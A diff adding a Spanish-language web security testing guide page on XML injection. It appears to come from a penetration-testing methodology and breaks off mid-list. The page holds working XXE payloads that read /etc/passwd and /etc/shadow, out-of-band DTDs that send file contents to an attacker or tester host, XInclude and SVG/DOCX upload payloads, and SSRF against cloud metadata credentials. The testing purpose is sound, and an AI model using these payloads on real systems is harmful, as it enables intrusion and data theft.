@@ -1,0 +1,387 @@
+<h1 id="xml-injection">Inyección XML</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-INJT-07</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>Las pruebas de inyección XML consisten en que un evaluador intenta inyectar o manipular un documento XML dentro de una aplicación. Si el analizador XML no valida contextualmente los datos o está configurado de forma insegura, la prueba arrojará un resultado positivo.</p>
+<p>Esta sección describe ejemplos prácticos de inyección XML. Primero se definirá una API de comunicación basada en XML y se explicarán sus principios de funcionamiento. Luego se demuestra el método de descubrimiento, en el que se intenta insertar metacaracteres XML. Una vez cumplido el primer paso, el evaluador tendrá información sobre la estructura XML, lo que hace posible inyectar datos y etiquetas XML (Tag Injection), o explotar la configuración del analizador para acceder a recursos locales y remotos (inyección de entidades externas XML / XXE).</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar los puntos de inyección XML.</li>
+<li>Evaluar los tipos de exploits que se pueden lograr y sus severidades.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Supongamos que existe una aplicación web moderna o un servicio web (como una API SOAP o RESTful) que acepta formato XML para el registro de usuarios.</p>
+<p>Cuando un usuario se registra rellenando un formulario HTML o interactuando con una aplicación cliente, la aplicación envía los datos del usuario en una petición <code>POST</code> que contiene un payload XML:</p>
+<pre><code class="language-http">POST /api/addUser HTTP/1.1
+Host: www.example.com
+Content-Type: application/xml
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;user&gt;
+    &lt;username&gt;tony&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>La aplicación de backend analiza este payload XML e inserta los valores analizados en la base de datos o en el estado interno (a menudo aumentándolo con campos generados por el servidor, como <code>userid</code>). Si la aplicación construye dinámicamente respuestas XML o reenvía estos datos XML a otro sistema de backend concatenando cadenas sin el saneamiento adecuado, se vuelve vulnerable a la inyección estructural de XML. Alternativamente, si el propio analizador XML está configurado de forma insegura, se vuelve vulnerable a ataques basados en entidades (XXE).</p>
+<h3 id="discovery">Descubrimiento</h3>
+<p>El primer paso para probar si una aplicación presenta una vulnerabilidad de inyección XML consiste en intentar insertar metacaracteres XML.</p>
+<p>Los metacaracteres XML son:</p>
+<ul>
+<li>Comillas simples y dobles (<code>&#39;</code> y <code>&quot;</code>): cuando no se sanean, estos caracteres pueden provocar una excepción durante el análisis XML o permitir a un atacante cerrar prematuramente un atributo. Esto ocurre cuando la comilla inyectada coincide con el carácter utilizado para encerrar el valor del atributo.</li>
+</ul>
+<p>Por ejemplo, supongamos que una aplicación utiliza comillas simples para los atributos:</p>
+<p><code>&lt;node attrib=&#39;$inputValue&#39;/&gt;</code></p>
+<p>Si se proporciona el payload <code>$inputValue = foo&#39;</code>, el XML resultante es:</p>
+<p><code>&lt;node attrib=&#39;foo&#39;&#39;/&gt;</code></p>
+<p>El documento XML resultante está mal formado y no es válido. Exactamente la misma lógica se aplica a las comillas dobles (<code>&quot;</code>) si el atributo está encerrado entre comillas dobles (p. ej., <code>&lt;node attrib=&quot;$inputValue&quot;/&gt;</code>).</p>
+<ul>
+<li>Paréntesis angulares: <code>&gt;</code> y <code>&lt;</code> - Al añadir un paréntesis angular de apertura o de cierre en una entrada de usuario como la siguiente:</li>
+</ul>
+<p><code>Username = foo&lt;</code></p>
+<p>la aplicación construirá un nuevo nodo:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;foo&lt;&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>pero, debido a la presencia del &#39;&lt;&#39; de apertura, el documento XML resultante no es válido.</p>
+<ul>
+<li>Etiqueta de comentario: <code>&lt;!--</code> y <code>--&gt;</code> - Esta secuencia de caracteres se interpreta como el comienzo o el final de un comentario. Así, al inyectar una de ellas en el parámetro Username:</li>
+</ul>
+<p><code>Username = foo&lt;!--</code></p>
+<p>la aplicación construirá un nodo como el siguiente:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;foo&lt;!--&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>que no será una secuencia XML válida.</p>
+<ul>
+<li>Ampersand: <code>&amp;</code> - El ampersand se utiliza en la sintaxis XML para representar entidades. El formato de una entidad es <code>&amp;symbol;</code>. Una entidad se asigna a un carácter del conjunto de caracteres Unicode.</li>
+</ul>
+<p>Por ejemplo:</p>
+<p><code>&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</code></p>
+<p>está bien formado y es válido, y representa el carácter ASCII <code>&lt;</code>.</p>
+<p>Si <code>&amp;</code> no está codificado con <code>&amp;amp;</code>, podría utilizarse para probar la inyección XML.</p>
+<p>De hecho, si se proporciona una entrada como la siguiente:</p>
+<p><code>Username = &amp;foo</code></p>
+<p>se creará un nuevo nodo:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;&amp;foo&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>pero, de nuevo, el documento no es válido: <code>&amp;foo</code> no termina con <code>;</code> y la entidad <code>&amp;foo;</code> no está definida.</p>
+<ul>
+<li>Delimitadores de sección CDATA: <code>&lt;![CDATA[</code> y <code>]]&gt;</code> - Las secciones CDATA se utilizan para escapar bloques de texto que contienen caracteres que de otro modo serían reconocidos como marcado. En otras palabras, los caracteres encerrados en una sección CDATA no son analizados por un analizador XML.</li>
+</ul>
+<p>Por ejemplo, si hay necesidad de representar la cadena <code>&lt;foo&gt;</code> dentro de un nodo de texto, se puede utilizar una sección CDATA:</p>
+<pre><code class="language-xml">&lt;node&gt;
+    &lt;![CDATA[&lt;foo&gt;]]&gt;
+&lt;/node&gt;
+</code></pre>
+<p>de modo que <code>&lt;foo&gt;</code> no se analizará como marcado y se considerará datos de caracteres.</p>
+<p>Si un nodo se crea de la siguiente manera:</p>
+<p><code>&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;</code></p>
+<p>el evaluador podría intentar inyectar la cadena de fin de CDATA <code>]]&gt;</code> para intentar invalidar el documento XML.</p>
+<p><code>userName = ]]&gt;</code></p>
+<p>esto se convertirá en:</p>
+<p><code>&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;</code></p>
+<p>que no es un fragmento XML válido.</p>
+<p>Otra prueba está relacionada con la etiqueta CDATA. Supongamos que el documento XML se procesa para generar una página HTML. En este caso, los delimitadores de sección CDATA pueden simplemente eliminarse, sin inspeccionar más su contenido. Entonces es posible inyectar etiquetas HTML, que se incluirán en la página generada, eludiendo por completo las rutinas de saneamiento existentes.</p>
+<p>Consideremos un ejemplo concreto. Supongamos que tenemos un nodo que contiene algún texto que se mostrará de vuelta al usuario.</p>
+<pre><code class="language-xml">&lt;html&gt;
+    $HTMLCode
+&lt;/html&gt;
+</code></pre>
+<p>Entonces, un atacante puede proporcionar la siguiente entrada:</p>
+<pre><code class="language-txt">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#39;xss&#39;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
+</code></pre>
+<p>y obtener el siguiente nodo:</p>
+<pre><code class="language-xml">&lt;html&gt;
+    &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#39;xss&#39;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Durante el procesamiento, los delimitadores de sección CDATA se eliminan, generando el siguiente código HTML:</p>
+<pre><code class="language-html">&lt;script&gt;
+    alert(&#39;XSS&#39;)
+&lt;/script&gt;
+</code></pre>
+<p>El resultado es que la aplicación es vulnerable a XSS.</p>
+<h3 id="tag-injection">Inyección de etiquetas (Tag Injection)</h3>
+<p>Una vez cumplido el primer paso y cuando el evaluador ha mapeado la estructura XML, es posible intentar inyectar etiquetas XML completas. Esto puede conducir a elusiones de lógica o a escalada de privilegios si la aplicación utiliza el XML analizado para tomar decisiones de autorización.</p>
+<p>Consideremos un escenario en el que la entrada del usuario se concatena directamente en una petición XML de backend. La aplicación construye dinámicamente el siguiente nodo XML para comunicarse con un servicio interno:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;$username&lt;/username&gt;
+    &lt;password&gt;$password&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;$email&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>Manipulando el campo de entrada $email, el evaluador puede inyectar una etiqueta de cierre para el elemento actual e iniciar uno nuevo. Si la entrada inyectada es:</p>
+<pre><code class="language-xml">s4tan@hell.com&lt;/email&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;email&gt;s4tan@hell.com
+</code></pre>
+<p>El backend generará el siguiente XML:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;tony&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>El XML resultante está bien formado. Además, es probable que el analizador XML procese las etiquetas <code>&lt;userid&gt;</code> duplicadas de forma secuencial y sobrescriba el valor inicial (<code>500</code>) con el último valor proporcionado (<code>0</code>, que a menudo representa un ID de administrador). En este caso, el evaluador ha inyectado con éxito un usuario con privilegios administrativos.</p>
+<p>El único problema es que las etiquetas <code>userid</code> y <code>email</code> aparecen dos veces. A menudo, los documentos XML se validan contra un esquema o una Definición de Tipo de Documento (DTD) y serán rechazados si no cumplen reglas estrictas de cardinalidad.</p>
+<p>Supongamos que el documento XML de backend está estrictamente especificado por una DTD que exige exactamente una etiqueta <code>userid</code> y una etiqueta <code>email</code> por usuario:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE user [
+    &lt;!ELEMENT user (username,password,userid,email) &gt;
+    &lt;!ELEMENT username (#PCDATA) &gt;
+    &lt;!ELEMENT password (#PCDATA) &gt;
+    &lt;!ELEMENT userid (#PCDATA) &gt;
+    &lt;!ELEMENT email (#PCDATA) &gt;
+]&gt;
+</code></pre>
+<p>En este caso, el simple ataque de inyección de etiquetas mostrado arriba fallará la validación antes de que ocurra cualquier procesamiento.</p>
+<p>Sin embargo, esta defensa se puede eludir si el evaluador controla los valores de varios nodos. Al inyectar una secuencia de inicio de comentario XML (<code>&lt;!--</code>) en un campo y una secuencia de fin de comentario XML (<code>--&gt;</code>) en otro, el evaluador puede ocultar los nodos originales generados por el servidor.</p>
+<p>Por ejemplo, el evaluador proporciona los siguientes payloads para las entradas:</p>
+<ul>
+<li>Username: tony</li>
+<li>Password: <code>Un6R34kb!e&lt;/password&gt;&lt;!--</code></li>
+<li>Email: <code>--&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;email&gt;s4tan@hell.com</code></li>
+</ul>
+<p>La aplicación de backend los concatena en la estructura XML:</p>
+<pre><code class="language-xml">&lt;user&gt;
+    &lt;username&gt;tony&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;&lt;!--&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;--&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<p>El nodo original <code>&lt;userid&gt;500&lt;/userid&gt;</code> y las etiquetas duplicadas han quedado comentados con éxito, dejando únicamente el <code>&lt;userid&gt;0&lt;/userid&gt;</code> inyectado. El documento ahora cumple las estrictas reglas de su DTD y la escalada de privilegios tiene éxito.</p>
+<h3 id="xml-external-entity-xxe-injection">Inyección de entidades externas XML (XXE)</h3>
+<p>El conjunto de entidades XML válidas puede ampliarse definiendo nuevas entidades. Si la definición de una entidad es un URI, la entidad se denomina entidad externa. A menos que se configure de otro modo, las entidades externas obligan al analizador XML a acceder al recurso especificado por el URI, por ejemplo, un archivo en la máquina local o en un sistema remoto. Este comportamiento expone la aplicación a ataques de entidades externas XML (XXE), que pueden utilizarse para realizar denegación de servicio, obtener acceso no autorizado a archivos, escanear redes internas y realizar Server-Side Request Forgery (SSRF).</p>
+<p>Para probar vulnerabilidades XXE básicas, se puede inyectar una declaración <code>DOCTYPE</code> con una entidad externa en el payload XML:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE user [ 
+    &lt;!ELEMENT user ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</code></pre>
+<blockquote>
+<p>Nota: el nombre del <code>DOCTYPE</code> (<code>user</code>) coincide con el elemento raíz real del documento, y la declaración <code>ELEMENT</code> se refiere a ese mismo elemento raíz; un nombre de <code>DOCTYPE</code>/<code>ELEMENT</code> que no coincida o que haya quedado de otro ejemplo (un error común de copiar y pegar al adaptar payloads XXE a un nuevo endpoint) seguirá siendo tolerado por la mayoría de los analizadores que no validan, pero mantenerlos coherentes evita fallos con cualquier analizador que sí realice validación de DTD.</p>
+</blockquote>
+<p>Esta prueba puede provocar una denegación de servicio en sistemas Unix si el analizador XML intenta resolver la entidad leyendo de <code>/dev/random</code>, bloqueándose potencialmente de forma indefinida (o consumiendo recursos significativos) mientras intenta sustituir el valor de la entidad.</p>
+<p>Otros payloads útiles para probar la divulgación de archivos locales incluyen:</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/win.ini&quot; &gt;
+&lt;!ENTITY xxe SYSTEM &quot;https://www.attacker.com/text.txt&quot; &gt;
+</code></pre>
+<h3 id="blind-xxe">XXE a ciegas (Blind XXE)</h3>
+<p>En muchos casos del mundo real, la aplicación no refleja el valor de una entidad externa en la respuesta HTTP, por lo que el ejemplo clásico de <code>/etc/passwd</code> en la respuesta mostrado arriba no se aplica directamente. Esto se conoce como <strong>Blind XXE</strong>. La vulnerabilidad sigue presente y sigue siendo explotable, pero la detección y la exfiltración de datos requieren técnicas fuera de banda (OOB) o, cuando el tráfico OOB está bloqueado, una técnica basada en errores.</p>
+<h4 id="out-of-band-oob-detection-via-parameter-entities">Detección fuera de banda (OOB) mediante entidades de parámetro</h4>
+<p>Algunos analizadores o reglas de WAF bloquean las entidades generales clásicas (<code>&amp;xxe;</code>) pero no restringen las <strong>entidades de parámetro</strong>, que solo pueden referenciarse dentro de una DTD y se declaran con un <code>%</code> en lugar de <code>&amp;</code>. Un evaluador puede usar una entidad de parámetro para obligar al servidor objetivo a realizar una petición DNS/HTTP saliente hacia un listener controlado por el atacante (p. ej., Burp Collaborator, <code>interact.sh</code> o un simple listener netcat/HTTP), confirmando que la inyección está activa aunque no se refleje nada:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &quot;http://&lt;tester-controlled-host&gt;/collect&quot;&gt;
+  %xxe;
+]&gt;
+&lt;foo&gt;test&lt;/foo&gt;
+</code></pre>
+<p>Una consulta DNS o un acceso HTTP resultante en el listener confirma que el analizador XML resuelve entidades externas, es decir, que la aplicación es vulnerable, incluso con una respuesta totalmente ciega.</p>
+<h4 id="out-of-band-data-exfiltration-via-a-malicious-external-dtd">Exfiltración de datos fuera de banda mediante una DTD externa maliciosa</h4>
+<p>Una vez confirmada la interacción OOB, el evaluador puede escalar de la detección a la exfiltración real de archivos alojando una DTD externa maliciosa en un servidor controlado por el atacante y encadenando entidades de parámetro para sacar el contenido de los archivos dentro de una petición posterior.</p>
+<p>DTD maliciosa alojada en <code>http://&lt;tester-controlled-host&gt;/evil.dtd</code>:</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://&lt;tester-controlled-host&gt;/?data=%file;&#39;&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre>
+<p>Payload enviado a la aplicación objetivo:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &quot;http://&lt;tester-controlled-host&gt;/evil.dtd&quot;&gt;
+  %xxe;
+]&gt;
+&lt;foo&gt;test&lt;/foo&gt;
+</code></pre>
+<p>Cuando el objetivo analiza este documento, obtiene <code>evil.dtd</code>, lee el archivo local en la entidad <code>%file;</code> y luego realiza una segunda petición saliente que incrusta el contenido del archivo como parámetro de consulta, que el evaluador captura en su listener. Dado que las URL no pueden transportar de forma segura datos binarios o con saltos de línea arbitrarios, esta técnica normalmente se limita a texto de una sola línea y seguro para URL; para archivos binarios o archivos que contengan caracteres que rompan la URL, los evaluadores suelen combinarla con un wrapper específico del lenguaje (p. ej., <code>php://filter/convert.base64-encode/resource=</code> de PHP) para codificar en base64 el contenido del archivo antes de la exfiltración, cuando la pila objetivo lo admite.</p>
+<h4 id="error-based-exfiltration-via-a-remote-external-dtd">Exfiltración basada en errores mediante una DTD externa remota</h4>
+<p>Esta variante todavía requiere que el objetivo realice una conexión saliente (para obtener la DTD del evaluador), pero, a diferencia de la técnica OOB anterior, no requiere que el servidor del atacante reciba una <em>segunda</em> petición que transporte los datos: el contenido del archivo se filtra de vuelta a través de la propia respuesta de error de la aplicación en lugar de una llamada de red. Esto es útil cuando las conexiones salientes están permitidas pero el cuerpo de respuesta de la segunda petición de exfiltración nunca llegaría al evaluador.</p>
+<p>DTD alojada en <code>http://&lt;tester-controlled-host&gt;/error.dtd</code>:</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;
+%eval;
+%error;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &quot;http://&lt;tester-controlled-host&gt;/error.dtd&quot;&gt;
+  %xxe;
+]&gt;
+&lt;foo&gt;test&lt;/foo&gt;
+</code></pre>
+<p>El analizador obtiene la DTD, intenta resolver una ruta inexistente construida a partir de la concatenación del contenido del archivo objetivo, falla y, según el analizador y lo detallado que sea el manejo de errores de la aplicación, lanza una excepción cuyo mensaje divulga la ruta intentada (y que, por lo tanto, ahora contiene el contenido del archivo). Si la aplicación devuelve en su respuesta los errores sin procesar del analizador, esto revela directamente el contenido del archivo.</p>
+<h4 id="error-based-exfiltration-by-repurposing-a-local-dtd-zero-outbound-connectivity">Exfiltración basada en errores reutilizando una DTD local (sin conectividad saliente)</h4>
+<p>La técnica anterior todavía necesita una obtención saliente. Si el entorno objetivo realmente no tiene ninguna conectividad saliente (con filtrado total de egreso), esa tampoco es una opción, y un DOCTYPE totalmente <em>interno</em> normalmente no puede redefinir una entidad de parámetro dentro de la definición de otra entidad de parámetro (la especificación XML lo permite solo dentro de DTD externas, y la mayoría de los analizadores lo hacen cumplir).</p>
+<p>Una solución fiable consiste en referenciar como DTD &quot;externa&quot; un archivo DTD que ya existe en el propio sistema de archivos local del objetivo (cargado mediante <code>file://</code> en lugar de <code>http://</code>), y luego redefinir una de las entidades que esa DTD ya declara. Dado que la DTD reutilizada sigue siendo técnicamente &quot;externa&quot; desde el punto de vista del analizador (aunque no se produzca acceso a la red), el truco de redefinición de entidades de parámetro vuelve a ser legal, y la misma fuga basada en errores puede desencadenarse sin conectividad saliente.</p>
+<p>Esto requiere conocer la ruta de un archivo DTD que realmente esté presente en el servidor. Los candidatos comunes que vale la pena sondear incluyen bibliotecas de procesamiento XML incluidas con el servidor de aplicaciones (DTD de aplicaciones/servlets incluidas dentro de JAR) y DTD a nivel de sistema operativo, como la DTD de documentación de GNOME/Yelp en muchos sistemas Linux (<code>/usr/share/yelp/dtd/docbookx.dtd</code>). Un evaluador puede enumerar candidatos enviando un payload que solo cargue la DTD (sin redefinir nada): si el archivo no existe, el analizador lanza un error de archivo no encontrado, por lo que se puede sondear una lista de palabras con rutas de DTD conocidas una por una.</p>
+<p>Ejemplo, suponiendo que <code>/usr/local/app/schema.dtd</code> existe en el objetivo y define una entidad llamada <code>custom_entity</code>:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;
+  &lt;!ENTITY % custom_entity &#39;
+    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+  &#39;&gt;
+  %local_dtd;
+]&gt;
+</code></pre>
+<p>Obsérvese que el valor redefinido de <code>custom_entity</code> se escribe usando referencias numéricas de caracteres (<code>&amp;#x25;</code> para <code>%</code>, <code>&amp;#x26;</code> para <code>&amp;</code>, <code>&amp;#x27;</code> para <code>&#39;</code>) en lugar de los caracteres literales. Esto es necesario, no estilístico: el texto de reemplazo se analiza a su vez como marcado de DTD una vez sustituido, por lo que un <code>%</code> o un <code>&amp;</code> literal dentro de él se expandiría de inmediato en lugar de sobrevivir intacto hasta que la redefinición surta efecto; las referencias numéricas difieren esa expansión hasta la etapa correcta.</p>
+<p>Esto carga la DTD local, sobrescribe su definición de <code>custom_entity</code> con el payload de exfiltración basada en errores y luego invoca <code>%local_dtd;</code> para que el analizador procese la entidad redefinida, desencadenando la misma fuga del contenido del archivo en el mensaje de error que antes, pero sin que salga del servidor un solo byte de tráfico de red. Herramientas como el proyecto <a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">dtd-finder</a> mantienen listas de rutas de archivos DTD conocidas (y pueden escanear un sistema de archivos o una imagen de contenedor en busca de las DTD realmente presentes) para acelerar esta búsqueda.</p>
+<h3 id="xinclude-attacks">Ataques XInclude</h3>
+<p>A veces el evaluador solo controla un único valor que luego se incrusta en un documento XML más grande generado por el servidor (por ejemplo, un campo de formulario que termina dentro de una petición SOAP de backend). En ese caso el evaluador no puede controlar ni inyectar una declaración <code>&lt;!DOCTYPE&gt;</code>, lo que descarta los ataques clásicos basados en entidades vistos arriba. <strong>XInclude</strong> es una parte independiente de la especificación XML que permite que un documento XML incorpore contenido de otra fuente, y puede activarse desde dentro de un valor de datos ordinario, sin necesidad de DOCTYPE:</p>
+<pre><code class="language-txt">productId=&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1
+</code></pre>
+<p>Si el backend incrusta este valor en su propio documento XML sin escapar y su analizador tiene habilitado el procesamiento de XInclude, el contenido del archivo referenciado se inserta en línea en ese punto del documento resultante.</p>
+<h3 id="xxe-via-file-upload">XXE mediante carga de archivos</h3>
+<p>Muchas aplicaciones aceptan la carga de formatos de archivo basados en XML o que contienen partes XML incrustadas, incluso cuando la interfaz de carga solo anuncia &quot;documentos&quot; o &quot;imágenes&quot;. Estos suelen pasarse por alto como puntos de inyección porque el evaluador no está interactuando con una API XML evidente.</p>
+<h4 id="svg">SVG</h4>
+<p>SVG es un formato de imagen basado en XML. Si una aplicación acepta cargas de SVG (o acepta formatos de imagen arbitrarios y resulta que procesa SVG), un archivo SVG manipulado puede incluir un DOCTYPE con una entidad externa que se resuelve durante el renderizado/procesamiento y, según el flujo de trabajo, el valor resuelto puede incluso renderizarse de forma visible dentro de la imagen generada:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;
+&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;
+  &lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+<h4 id="office-open-xml-documents-docx--xlsx--pptx">Documentos Office Open XML (DOCX / XLSX / PPTX)</h4>
+<p>Los formatos ofimáticos modernos son archivos ZIP que contienen múltiples partes XML. Un evaluador puede descomprimir un archivo de muestra legítimo, inyectar un DOCTYPE/entidad en una de las partes XML internas y volver a comprimirlo, y luego subirlo a cualquier funcionalidad que analice o convierta el documento en el servidor (generación de vistas previas, extracción de texto, conversión de formato, etc.).</p>
+<p>Ejemplo: edición de <code>word/document.xml</code> dentro de un <code>.docx</code>:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;w:document&gt;
+  &lt;w:body&gt;
+    &lt;w:p&gt;&lt;w:r&gt;&lt;w:t&gt;&amp;xxe;&lt;/w:t&gt;&lt;/w:r&gt;&lt;/w:p&gt;
+  &lt;/w:body&gt;
+&lt;/w:document&gt;
+</code></pre>
+<p>El mismo enfoque se aplica a <code>xl/workbook.xml</code> en archivos <code>.xlsx</code> y a las partes equivalentes en archivos <code>.pptx</code>. Esta es una comprobación útil para cualquier endpoint que ingiera documentos ofimáticos para indexación, generación de miniaturas o conversión; esos flujos de procesamiento suelen construirse sobre bibliotecas XML más antiguas o configuradas de forma laxa, incluso cuando la capa de API principal de la aplicación ha sido endurecida.</p>
+<h4 id="other-xml-based-formats">Otros formatos basados en XML</h4>
+<p>Los evaluadores también deben considerar formatos basados en XML menos obvios que una aplicación podría aceptar como entrada, incluidos XLIFF (archivos de intercambio de traducción), feeds RSS/Atom, sobres SOAP y cualquier formato de importación personalizado documentado como &quot;XML&quot; o &quot;basado en XML&quot;. Cualquiera de ellos puede transportar los mismos payloads de DOCTYPE/entidad o de XInclude mostrados arriba.</p>
+<h3 id="escalating-impact-ssrf-and-credential-capture">Escalada del impacto: SSRF y captura de credenciales</h3>
+<p>XXE no se limita a la divulgación de archivos locales: el mismo mecanismo de entidades externas es una primitiva de falsificación de peticiones, por lo que los evaluadores deben evaluar el impacto más allá de <code>/etc/passwd</code>:</p>
+<ul>
+<li><strong>SSRF hacia servicios de metadatos en la nube.</strong> En objetivos alojados en la nube, apuntar una entidad al endpoint de metadatos de la instancia (p. ej., <code>http://169.254.169.254/...</code> en AWS) puede divulgar credenciales temporales; pero hay que tener en cuenta que el valor por defecto actual de AWS, IMDSv2, requiere una petición <code>PUT</code> más una cabecera personalizada para obtener un token de sesión antes de que cualquier <code>GET</code> tenga éxito, y el SSRF impulsado por XXE (mediante un identificador <code>SYSTEM</code>) normalmente solo puede emitir un <code>GET</code> simple. En la práctica, esto significa que un clásico robo de credenciales de metadatos mediante XXE hoy en día solo funciona en su mayoría contra instancias más antiguas o explícitamente mal configuradas que todavía tienen IMDSv1 habilitado (<code>HttpTokens</code> no establecido en <code>required</code>); se deben revisar las opciones de metadatos de la instancia en lugar de asumir que el endpoint es explotable por defecto. Los endpoints de metadatos equivalentes de Azure y GCP requieren de manera similar cabeceras específicas (<code>Metadata: true</code> / <code>Metadata-Flavor: Google</code>) que una entidad simple <code>SYSTEM &quot;http://...&quot;</code> no puede establecer, por la misma razón. Incluso cuando el robo directo de credenciales está bloqueado, alcanzar el endpoint de metadatos sigue siendo útil para confirmar el SSRF y para averiguar en qué nube se ejecuta el objetivo.</li>
+<li><strong>Escaneo de red/puertos internos.</strong> Las diferencias en el tiempo de respuesta o en los mensajes de error entre hosts/puertos internos alcanzables e inalcanzables pueden utilizarse para mapear la topología de la red interna a través del servidor vulnerable.</li>
